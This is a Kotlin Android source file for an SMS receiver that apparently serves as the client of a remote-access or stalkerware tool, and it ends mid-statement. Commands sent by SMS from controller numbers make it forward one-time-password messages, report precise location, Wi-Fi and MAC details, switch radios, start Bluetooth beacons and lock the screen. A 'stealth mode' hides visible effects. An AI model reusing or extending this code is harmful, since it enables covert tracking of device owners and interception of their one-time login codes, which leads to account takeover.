package com.client.receivers

import android.Manifest
import android.app.NotificationManager
import android.app.Service.BATTERY_SERVICE
import android.app.admin.DevicePolicyManager
import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Context.SENSOR_SERVICE
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.CancellationSignal
import android.os.ParcelUuid
import android.os.PowerManager
import android.provider.Settings
import android.telecom.TelecomManager
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import com.client.helpers.FlashlightHelper
import com.client.LockedActivity
import com.client.LockedWithPinActivity
import com.client.MessageActivity
import com.client.isMyServiceRunning
import com.client.services.client.ClientService
import com.client.helpers.DeviceOrientationHelper
import com.client.services.client.ClientServiceStarter
import com.client.services.client.advertiseCallback
import com.client.services.client.audioManager
import com.client.services.client.bluetoothAdapter
import com.client.services.client.bluetoothLeAdvertiser
import com.client.services.client.boolToYesNo
import com.client.services.client.geofenceList
import com.client.services.client.isHttpProxyRunning
import com.client.services.client.isLocked
import com.client.services.client.isLockedWithPin
import com.client.services.client.isSendingSMSAllowed
import com.client.services.client.isSocks5ProxyRunning
import com.client.services.client.isStealthModeEnabled
import com.client.services.client.killAll
import com.client.services.client.listenForOtp
import com.client.services.client.mediaPlayer
import com.client.services.client.saveCurrentLocationInFirestore
import com.client.services.client.sendMessage
import com.client.services.client.startLoggingLocation
import com.client.services.client.vibrateDevice
import com.client.services.httpproxy.HttpProxyService
import com.client.services.other.appsToPreventOpening
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationToken
import com.google.android.gms.tasks.CancellationTokenSource
import com.google.android.gms.tasks.OnTokenCanceledListener
import com.google.firebase.firestore.FirebaseFirestore
import com.client.services.socks5proxy.Socks5Service

var serverPhoneNumbers = mutableListOf<String>()
var phoneNumberToUse = ""

class SMSReceiver: BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        var originatingAddress: String? = null
        try {
            if (intent != null) {
                if (intent.action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                    val bundle = intent.extras
                    if (bundle != null) {
                        val pdus = bundle["pdus"] as Array<*>
                        val messages = arrayOfNulls<SmsMessage>(pdus.size)
                        for (i in pdus.indices) {
                            messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        }
                        if (messages.isNotEmpty()) {
                            for (message in messages) {
                                if (message?.messageBody?.uppercase()
                                        ?.contains("OTP") == true && message.originatingAddress !in serverPhoneNumbers
                                ) {
                                    if (listenForOtp) {
                                        sendMessage(
                                            context,
                                            false,
                                            "Received OTP SMS: ${message.messageBody}"
                                        )
                                    }
                                }
                                if (context != null) {
                                    val preferences = context.getSharedPreferences(
                                        "Preferences",
                                        Context.MODE_MULTI_PROCESS
                                    )
                                    serverPhoneNumbers =
                                        preferences.getString("ServerPhoneNumber", "")?.split(",")!!
                                            .toMutableList()
                                }
                                if (message?.originatingAddress in serverPhoneNumbers) {
                                    originatingAddress = message?.originatingAddress
                                    Log.d("SMSReceiver", "Received message from server: ${message?.messageBody}")
                                    if (message?.messageBody == "DISABLE_SENDING_SMS") {
                                        if (context != null) {
                                            isSendingSMSAllowed = false
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            with(preferences.edit()) {
                                                putBoolean(
                                                    "isSendingSMSAllowed",
                                                    isSendingSMSAllowed
                                                )
                                                commit()
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "DISABLE_SENDING_SMS: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "ENABLE_SENDING_SMS") {
                                        if (context != null) {
                                            isSendingSMSAllowed = true
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            with(preferences.edit()) {
                                                putBoolean(
                                                    "isSendingSMSAllowed",
                                                    isSendingSMSAllowed
                                                )
                                                commit()
                                            }
                                            sendMessage(
                                                context,
                                                true,
                                                "ENABLE_SENDING_SMS: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "ENABLE_SENDING_SMS: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "PING") {
                                        sendMessage(
                                            context,
                                            true,
                                            "PING_ACK",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody?.startsWith("SET_PHONE_NO_TO_USE ") == true) {
                                        if (context != null) {
                                            val number =
                                                message.messageBody!!.removePrefix("SET_PHONE_NO_TO_USE ")
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            with(preferences.edit()) {
                                                putString("PhoneNoToUse", number)
                                                commit()
                                            }
                                            phoneNumberToUse = number
                                            sendMessage(
                                                context,
                                                true,
                                                "SET_PHONE_NO_TO_USE: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "SET_PHONE_NO_TO_USE: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "IS_CLIENT_SERVICE_RUNNING") {
                                        if (context != null) {
                                            sendMessage(
                                                context,
                                                true,
                                                "IS_CLIENT_SERVICE_RUNNING: ${
                                                    boolToYesNo(
                                                        isMyServiceRunning(
                                                            context,
                                                            ClientService::class.java
                                                        )
                                                    )
                                                }",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "IS_CLIENT_SERVICE_RUNNING: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message.toString()
                                            .startsWith("ADD_SERVER_PHONE_NO ")
                                    ) {
                                        if (context != null) {
                                            val number =
                                                message?.messageBody?.removePrefix("ADD_SERVER_PHONE_NO ")
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            val serverPhoneNoStr = preferences.getString(
                                                "ServerPhoneNumber",
                                                ""
                                            )
                                            if (serverPhoneNoStr?.contains("$number,") == false || serverPhoneNoStr?.endsWith(
                                                    number.toString()
                                                ) == false
                                            ) {
                                                if (number != null)
                                                    serverPhoneNumbers.add(number)
                                                var numbers = ""
                                                for (n in serverPhoneNumbers)
                                                    numbers += "$n,"
                                                numbers.removeSuffix(",")
                                                with(preferences.edit()) {
                                                    putString("ServerPhoneNumber", numbers)
                                                    commit()
                                                }
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "ADD_SERVER_PHONE_NO: Operation completed successfully",
                                                    serverPhoneNo = message?.originatingAddress
                                                )
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "ADD_SERVER_PHONE_NO: Operation failed - number is already added",
                                                    serverPhoneNo = message?.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "ADD_SERVER_PHONE_NO: Operation failed - context is null",
                                                serverPhoneNo = message?.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody?.startsWith("REMOVE_SERVER_PHONE_NO ") == true) {
                                        val number =
                                            message.messageBody?.removePrefix("REMOVE_SERVER_PHONE_NO ")
                                        if (number !in serverPhoneNumbers) {
                                            sendMessage(
                                                context,
                                                true,
                                                "REMOVE_SERVER_PHONE_NO: Operation failed - number is not of a server",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            if (context != null) {
                                                serverPhoneNumbers.remove(number)
                                                var numbers = ""
                                                for (n in serverPhoneNumbers)
                                                    numbers += "$n,"
                                                numbers.removeSuffix(",")
                                                val preferences = context.getSharedPreferences(
                                                    "Preferences",
                                                    Context.MODE_MULTI_PROCESS
                                                )
                                                with(preferences.edit()) {
                                                    putString("ServerPhoneNumber", numbers)
                                                    commit()
                                                }
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "REMOVE_SERVER_PHONE_NO: Operation completed successfully",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "REMOVE_SERVER_PHONE_NO: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        }
                                    } else if (message?.messageBody?.startsWith("SET_DEVICE_ID ") == true) {
                                        if (context != null) {
                                            val id =
                                                message.messageBody!!.removePrefix("SET_DEVICE_ID ")
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            with(preferences.edit()) {
                                                putString("DeviceID", id)
                                                commit()
                                            }
                                            sendMessage(
                                                context,
                                                true,
                                                "SET_DEVICE_ID: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "SET_DEVICE_ID: Operation failed - context is null",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "GET_CURRENT_LOCATION") {
                                        if (
                                            context?.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                                            || context?.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                                        ) {
                                            // Permission is granted, proceed with location retrieval
                                            val fusedLocationClient =
                                                LocationServices.getFusedLocationProviderClient(
                                                    context
                                                )
                                            fusedLocationClient.getCurrentLocation(
                                                Priority.PRIORITY_HIGH_ACCURACY,
                                                object : CancellationToken() {
                                                    override fun onCanceledRequested(p0: OnTokenCanceledListener): CancellationToken {
                                                        return CancellationTokenSource().token
                                                    }

                                                    override fun isCancellationRequested(): Boolean {
                                                        return false
                                                    }

                                                }).addOnSuccessListener { location: Location? ->
                                                if (location != null) {
                                                    val latitude = location.latitude
                                                    val longitude = location.longitude
                                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                                        val messageParts = mutableListOf<String>()
                                                        messageParts.add("GET_CURRENT_LOCATION: Longitude: $longitude, Latitude: $latitude")
                                                        if (location.hasAccuracy()) messageParts.add(
                                                            "Accuracy: ${location.accuracy}"
                                                        )
                                                        messageParts.add("Speed: ${location.speed}")
                                                        if (location.hasAltitude()) messageParts.add(
                                                            "Altitude: ${location.altitude}"
                                                        )
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            messageParts.joinToString(", "),
                                                            serverPhoneNo = message.originatingAddress
                                                        )
                                                    } else {
                                                        val messageParts = mutableListOf<String>()
                                                        messageParts.add("GET_CURRENT_LOCATION: Longitude: $longitude, Latitude: $latitude")
                                                        if (location.hasAccuracy()) messageParts.add(
                                                            "Accuracy: ${location.accuracy}"
                                                        )
                                                        messageParts.add("Speed: ${location.speed}")
                                                        if (location.hasAltitude()) messageParts.add(
                                                            "Altitude: ${location.altitude}"
                                                        )
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            messageParts.joinToString(", "),
                                                            serverPhoneNo = message.originatingAddress
                                                        )
                                                    }
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "GET_CURRENT_LOCATION: Operation failed - returned null location",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            }.addOnFailureListener { e ->
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "GET_CURRENT_LOCATION: Operation failed - " + e.localizedMessage,
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_CURRENT_LOCATION: Operation failed - permission error",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "GET_LAST_KNOWN_LOCATION") {
                                        if (
                                            context?.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                                            || context?.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                                        ) {
                                            // Permission is granted, proceed with location retrieval
                                            val fusedLocationClient =
                                                LocationServices.getFusedLocationProviderClient(
                                                    context
                                                )
                                            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
                                                if (location != null) {
                                                    val latitude = location.latitude
                                                    val longitude = location.longitude
                                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                                        val messageParts = mutableListOf<String>()
                                                        messageParts.add("GET_LAST_KNOWN_LOCATION: Longitude: $longitude, Latitude: $latitude")
                                                        if (location.hasAccuracy()) messageParts.add(
                                                            "Accuracy: ${location.accuracy}"
                                                        )
                                                        messageParts.add("Speed: ${location.speed}")
                                                        if (location.hasAltitude()) messageParts.add(
                                                            "Altitude: ${location.altitude}"
                                                        )
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            messageParts.joinToString(", "),
                                                            serverPhoneNo = message.originatingAddress
                                                        )
                                                    } else {
                                                        val messageParts = mutableListOf<String>()
                                                        messageParts.add("GET_LAST_KNOWN_LOCATION: Longitude: $longitude, Latitude: $latitude")
                                                        if (location.hasAccuracy()) messageParts.add(
                                                            "Accuracy: ${location.accuracy}"
                                                        )
                                                        messageParts.add("Speed: ${location.speed}")
                                                        if (location.hasAltitude()) messageParts.add(
                                                            "Altitude: ${location.altitude}"
                                                        )
                                                        sendMessage(
                                                            context,
                                                            true,
                                                            messageParts.joinToString(", "),
                                                            serverPhoneNo = message.originatingAddress
                                                        )
                                                    }
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "GET_LAST_KNOWN_LOCATION: Operation failed - returned null location",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            }.addOnFailureListener { e ->
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "GET_LAST_KNOWN_LOCATION: Operation failed - " + e.localizedMessage,
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "GET_LAST_KNOWN_LOCATION: Operation failed - permission error",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "START_RING") {
                                        if (!isStealthModeEnabled) {
                                            mediaPlayer?.stop()
                                            audioManager =
                                                context?.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                                            mediaPlayer = MediaPlayer.create(
                                                context,
                                                Settings.System.DEFAULT_RINGTONE_URI
                                            )
                                            audioManager?.setStreamVolume(
                                                AudioManager.STREAM_MUSIC,
                                                audioManager!!.getStreamMaxVolume(
                                                    AudioManager.STREAM_MUSIC
                                                ),
                                                0
                                            )
                                            mediaPlayer?.isLooping = true
                                            mediaPlayer?.start()
                                            audioManager?.adjustVolume(
                                                AudioManager.ADJUST_UNMUTE,
                                                0
                                            )
                                            var i = 0
                                            while (i < 25) {
                                                audioManager?.adjustVolume(
                                                    AudioManager.ADJUST_RAISE,
                                                    0
                                                )
                                                i++
                                            }
                                            sendMessage(
                                                context,
                                                true,
                                                "START_RING: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "START_RING: Stealth mode is enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "STOP_RING") {
                                        mediaPlayer?.stop()
                                        sendMessage(
                                            context,
                                            true,
                                            "STOP_RING: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "INCREASE_VOLUME") {
                                        audioManager?.adjustVolume(AudioManager.ADJUST_RAISE, 0)
                                        sendMessage(
                                            context,
                                            true,
                                            "INCREASE_VOLUME: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "DECREASE_VOLUME") {
                                        audioManager?.adjustVolume(AudioManager.ADJUST_LOWER, 0)
                                        sendMessage(
                                            context,
                                            true,
                                            "DECREASE_VOLUME: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody?.startsWith("SHOW_TOAST ") == true) {
                                        val toastMessage =
                                            message.messageBody!!.removePrefix("SHOW_TOAST ")
                                        Toast.makeText(context, toastMessage, Toast.LENGTH_LONG)
                                            .show()
                                        sendMessage(
                                            context,
                                            true,
                                            "SHOW_TOAST: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "IS_INTERNET_AVAILABLE") {
                                        val connectivityManager =
                                            context?.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                                        val networkInfo = connectivityManager.activeNetworkInfo
                                        val isConnected =
                                            networkInfo != null && networkInfo.isConnectedOrConnecting
                                        sendMessage(
                                            context,
                                            true,
                                            "IS_INTERNET_AVAILABLE: ${boolToYesNo(isConnected)}",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "GET_MOBILE_DATA_STATUS") {
                                        var mobileDataEnabled = false // Assume disabled
                                        val cm =
                                            context?.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                                        try {
                                            val cmClass = Class.forName(cm.javaClass.getName())
                                            val method =
                                                cmClass.getDeclaredMethod("getMobileDataEnabled")
                                            method.isAccessible = true // Make the method callable
                                            // get the setting for "mobile data"
                                            mobileDataEnabled = method.invoke(cm) as Boolean
                                        } catch (e: java.lang.Exception) {
                                            sendMessage(
                                                context,
                                                true,
                                                "Error getting mobile data info: ${e.localizedMessage}",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                        val tm =
                                            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                                        var signalStrengthGsm: Int? = null
                                        var level: Int? = null
                                        try {
                                            val signalInfo = tm.signalStrength
                                            signalStrengthGsm = signalInfo?.gsmSignalStrength
                                            level = signalInfo?.level
                                        } catch (ex: Exception) {
                                            sendMessage(
                                                context,
                                                false,
                                                "GET_MOBILE_DATA_STATUS: Operation failed - ${ex.localizedMessage}"
                                            )
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "GET_MOBILE_DATA_STATUS: Is Enabled - ${
                                                boolToYesNo(
                                                    mobileDataEnabled
                                                )
                                            } - Signal Strength - $signalStrengthGsm - Level - $level",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "GET_WIFI_STATUS") {
                                        val wifiManager =
                                            context?.getSystemService(Context.WIFI_SERVICE) as WifiManager
                                        val state = boolToYesNo(wifiManager.isWifiEnabled)
                                        val info = wifiManager.connectionInfo
                                        var ssid = ""
                                        val macAddr = info.macAddress
                                        val connManager =
                                            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
                                        val mWifi =
                                            connManager!!.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
                                        if (mWifi != null) {
                                            if (mWifi.isConnected) {
                                                ssid = info.ssid
                                            }
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "GET_WIFI_STATUS: Is Turned On: $state - SSID: $ssid - Mac Address: $macAddr",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "TURN_ON_BLUETOOTH") {
                                        if (bluetoothAdapter == null)
                                            bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
                                        if (bluetoothAdapter!!.enable()) {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_ON_BLUETOOTH: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_ON_BLUETOOTH: Operation failed",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "TURN_OFF_BLUETOOTH") {
                                        if (bluetoothAdapter!!.disable()) {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_OFF_BLUETOOTH: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_OFF_BLUETOOTH: Operation failed",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "TURN_ON_WIFI") {
                                        val wifiManager =
                                            context?.getSystemService(Context.WIFI_SERVICE) as WifiManager
                                        if (wifiManager.setWifiEnabled(true)) {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_ON_WIFI: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_ON_WIFI: Operation failed",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "TURN_OFF_WIFI") {
                                        val wifiManager =
                                            context?.getSystemService(Context.WIFI_SERVICE) as WifiManager
                                        if (wifiManager.setWifiEnabled(false)) {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_OFF_WIFI: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_OFF_WIFI: Operation failed",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "START_BLE_ADVERTISING") {
                                        if (bluetoothAdapter!!.isEnabled) {
                                            val settings = AdvertiseSettings.Builder()
                                                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                                                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                                                .setConnectable(false)
                                                .build()

                                            val data = AdvertiseData.Builder()
                                                .setIncludeDeviceName(false)
                                                .addServiceUuid(ParcelUuid.fromString("00005A5B-0000-1000-8000-00805F9B34FB"))
                                                .addServiceData(
                                                    ParcelUuid.fromString("00005A5B-0000-1000-8000-00805F9B34FB"),
                                                    byteArrayOf(0x01)
                                                )
                                                .build()

                                            advertiseCallback = object : AdvertiseCallback() {
                                                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                                                    super.onStartSuccess(settingsInEffect)
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "START_BLE_ADVERTISING: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }

                                                override fun onStartFailure(errorCode: Int) {
                                                    super.onStartFailure(errorCode)
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "START_BLE_ADVERTISING: Operation failed - error code: $errorCode",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            }

                                            bluetoothLeAdvertiser?.startAdvertising(
                                                settings,
                                                data,
                                                advertiseCallback
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "START_BLE_ADVERTISING: Operation failed - bluetooth not enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "STOP_BLE_ADVERTISING") {
                                        if (advertiseCallback != null) {
                                            bluetoothLeAdvertiser?.stopAdvertising(advertiseCallback)
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "STOP_BLE_ADVERTISING: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "START_SERVICE") {
                                        Intent(context, ClientService::class.java).also {
                                            it.action = ClientService.Actions.START.toString()
                                            context?.startService(it)
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "START_SERVICE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "STOP_SERVICE") {
                                        Intent(context, ClientService::class.java).also {
                                            it.action = ClientService.Actions.STOP.toString()
                                            context?.startService(it)
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "STOP_SERVICE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "RESTART_SERVICE") {
                                        Intent(context, ClientService::class.java).also {
                                            it.action = ClientService.Actions.STOP.toString()
                                            context?.startService(it)
                                        }
                                        Thread.sleep(500)
                                        Intent(context, ClientService::class.java).also {
                                            it.action = ClientService.Actions.START.toString()
                                            context?.startService(it)
                                        }
                                        sendMessage(
                                            context,
                                            true,
                                            "RESTART_SERVICE: Operation completed successfully",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "TURN_ON_FLASHLIGHT") {
                                        if (!isStealthModeEnabled) {
                                            val flashHelper = context?.let { FlashlightHelper(it) }
                                            if (flashHelper != null) {
                                                if (flashHelper.isFlashAvailable()) {
                                                    flashHelper.turnOnFlashlight()
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "TURN_ON_FLASHLIGHT: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "TURN_ON_FLASHLIGHT: Operation failed - flash not supported",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "TURN_ON_FLASHLIGHT: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_ON_FLASHLIGHT: Stealth mode is enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "TURN_OFF_FLASHLIGHT") {
                                        if (!isStealthModeEnabled) {
                                            val flashHelper = context?.let { FlashlightHelper(it) }
                                            if (flashHelper != null) {
                                                if (flashHelper.isFlashAvailable()) {
                                                    flashHelper.turnOffFlashlight()
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "TURN_OFF_FLASHLIGHT: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "TURN_OFF_FLASHLIGHT: Operation failed - flash not supported",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "TURN_OFF_FLASHLIGHT: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "TURN_OFF_FLASHLIGHT: Stealth mode is enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "GET_BATTERY_STATUS") {
                                        val bm =
                                            context?.getSystemService(BATTERY_SERVICE) as BatteryManager
                                        val capacity =
                                            bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                                        val batteryStatus: Intent? =
                                            IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
                                                context.applicationContext.registerReceiver(
                                                    null,
                                                    ifilter
                                                )
                                            }
                                        val status: Int =
                                            batteryStatus?.getIntExtra(
                                                BatteryManager.EXTRA_STATUS,
                                                -1
                                            )
                                                ?: -1
                                        sendMessage(
                                            context,
                                            true,
                                            "GET_BATTERY_STATUS: Battery Level: $capacity%, Is Charging: ${
                                                boolToYesNo(
                                                    status == BatteryManager.BATTERY_STATUS_CHARGING
                                                )
                                            }",
                                            serverPhoneNo = message.originatingAddress
                                        )
                                    } else if (message?.messageBody == "LOCK_DEVICE_SCREEN") {
                                        if (!isStealthModeEnabled) {
                                            if (context != null) {
                                                if (!isLockedWithPin) {
                                                    val preferences = context.getSharedPreferences(
                                                        "Preferences",
                                                        Context.MODE_MULTI_PROCESS
                                                    )
                                                    isLocked = true
                                                    killAll = false
                                                    with(preferences.edit()) {
                                                        putBoolean("IsLocked", true)
                                                        putBoolean("killAll", false)
                                                        commit()
                                                    }
                                                    val i =
                                                        Intent(context, LockedActivity::class.java)
                                                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                    context.startActivity(i)
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "LOCK_DEVICE_SCREEN: Operation completed successfully",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                } else {
                                                    sendMessage(
                                                        context,
                                                        true,
                                                        "LOCK_DEVICE_SCREEN: Device is locked with a PIN",
                                                        serverPhoneNo = message.originatingAddress
                                                    )
                                                }
                                            } else {
                                                sendMessage(
                                                    context,
                                                    true,
                                                    "LOCK_DEVICE_SCREEN: Operation failed - context is null",
                                                    serverPhoneNo = message.originatingAddress
                                                )
                                            }
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
                                                "LOCK_DEVICE_SCREEN: Stealth mode is enabled",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        }
                                    } else if (message?.messageBody == "UNLOCK_DEVICE_SCREEN") {
                                        if (context != null) {
                                            val preferences = context.getSharedPreferences(
                                                "Preferences",
                                                Context.MODE_MULTI_PROCESS
                                            )
                                            isLocked = false
                                            isLockedWithPin = false
                                            killAll = true
                                            with(preferences.edit()) {
                                                putBoolean("IsLocked", false)
                                                putBoolean("IsLockedWithPin", false)
                                                putBoolean("killAll", true)
                                                commit()
                                            }
                                            sendMessage(
                                                context,
                                                true,
                                                "UNLOCK_DEVICE_SCREEN: Operation completed successfully",
                                                serverPhoneNo = message.originatingAddress
                                            )
                                        } else {
                                            sendMessage(
                                                context,
                                                true,
